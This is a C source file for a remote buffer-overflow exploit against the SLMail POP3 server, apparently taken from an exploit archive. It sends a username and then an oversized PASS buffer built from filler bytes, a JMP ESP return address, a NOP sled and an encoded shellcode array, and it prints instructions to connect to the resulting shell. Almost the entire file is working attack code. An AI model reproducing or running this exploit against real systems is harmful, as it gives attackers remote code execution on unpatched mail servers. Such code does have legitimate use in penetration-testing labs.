/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 443
 
unsigned char shellcode[] = 
"\xdb\xd8\xbf\xaa\x25\x35\xf7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x7d\x17\x83\xc5\x04\x03\xd7\x36\xd7\x02\xdb\xd1\x95"
"\xed\x23\x22\xfa\x64\xc6\x13\x3a\x12\x83\x04\x8a\x50\xc1\xa8"
"\x61\x34\xf1\x3b\x07\x91\xf6\x8c\xa2\xc7\x39\x0c\x9e\x34\x58"
"\x8e\xdd\x68\xba\xaf\x2d\x7d\xbb\xe8\x50\x8c\xe9\xa1\x1f\x23"
"\x1d\xc5\x6a\xf8\x96\x95\x7b\x78\x4b\x6d\x7d\xa9\xda\xe5\x24"
"\x69\xdd\x2a\x5d\x20\xc5\x2f\x58\xfa\x7e\x9b\x16\xfd\x56\xd5"
"\xd7\x52\x97\xd9\x25\xaa\xd0\xde\xd5\xd9\x28\x1d\x6b\xda\xef"
"\x5f\xb7\x6f\xeb\xf8\x3c\xd7\xd7\xf9\x91\x8e\x9c\xf6\x5e\xc4"
"\xfa\x1a\x60\x09\x71\x26\xe9\xac\x55\xae\xa9\x8a\x71\xea\x6a"
"\xb2\x20\x56\xdc\xcb\x32\x39\x81\x69\x39\xd4\xd6\x03\x60\xb1"
"\x1b\x2e\x9a\x41\x34\x39\xe9\x73\x9b\x91\x65\x38\x54\x3c\x72"
"\x3f\x4f\xf8\xec\xbe\x70\xf9\x25\x05\x24\xa9\x5d\xac\x45\x22"
"\x9d\x51\x90\xe5\xcd\xfd\x4b\x46\xbd\xbd\x3b\x2e\xd7\x31\x63"
"\x4e\xd8\x9b\x0c\xe5\x23\x4c\x39\xf1\x2b\xf4\x55\x07\x2b\x05"
"\x1d\x8e\xcd\x6f\x71\xc7\x46\x18\xe8\x42\x1c\xb9\xf5\x58\x59"
"\xf9\x7e\x6f\x9e\xb4\x76\x1a\x8c\x21\x77\x51\xee\xe4\x88\x4f"
"\x86\x6b\x1a\x14\x56\xe5\x07\x83\x01\xa2\xf6\xda\xc7\x5e\xa0"
"\x74\xf5\xa2\x34\xbe\xbd\x78\x85\x41\x3c\x0c\xb1\x65\x2e\xc8"
"\x3a\x22\x1a\x84\x6c\xfc\xf4\x62\xc7\x4e\xae\x3c\xb4\x18\x26"
"\xb8\xf6\x9a\x30\xc5\xd2\x6c\xdc\x74\x8b\x28\xe3\xb9\x5b\xbd"
"\x9c\xa7\xfb\x42\x77\x6c\x1b\xa1\x5d\x99\xb4\x7c\x34\x20\xd9"
"\x7e\xe3\x67\xe4\xfc\x01\x18\x13\x1c\x60\x1d\x5f\x9a\x99\x6f"
"\xf0\x4f\x9d\xdc\xf1\x45";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3500];
      char buf[3500];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3500);   //allocate 3500 of buffers for the variable buf. 
      memset(evil, 0x00, 2606);  //allocate 2606 of buffers for the var evil.
      memset(evil, 0x41, 2606);  // set var evil with 2606 of "A"s. (evil = "A"*2606)
      ptr = &evil[0]; //pointer variable ptr holds the address of variable evil"
      ptr = ptr + 2607; // The nop followed by shellcode should start after the crashed bytes 2606. ptr is char and it's 1 byte. 1*2607. 
      memcpy(ptr, &nopsled, 16);  //copy 16 of nop values to ptr(holds var evil's address with "A" values. (evil = "A"*2606+retadd+nop*16)
      ptr = ptr + 16;  //add buffer space after var evil's memory address to place Nops. 
      memcpy(ptr, &shellcode, 351);   //add 351 of shellcodes to ptr. (evil = "A"*2606+retadd+nop*16+shellcode)
      *(long*)&evil[2606] = 0x5f4a358f; // "\x8f\x35\x4a\x5f"; JMP ESP 0x5f4a358f FFE4 JMP ESP (evil = "A"*2606+retadd)

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);   //sprint the value of evil to buf
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);  //send the buf to the int sock of exploit function.
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
